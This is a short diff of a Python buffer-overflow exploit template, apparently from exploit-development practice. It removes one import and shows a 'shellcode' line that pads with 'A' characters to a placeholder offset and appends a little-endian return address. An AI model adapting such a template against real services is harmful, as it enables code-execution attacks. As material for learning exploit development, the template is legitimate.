@@ -1,6 +1,5 @@
 #!/usr/bin/python
 import sys, socket
-from time import sleep
 
 # example for address 0x625011af == "\xaf\x11\x50\x62"
 shellcode = "A" * < offset_value > + < little_endian_format >
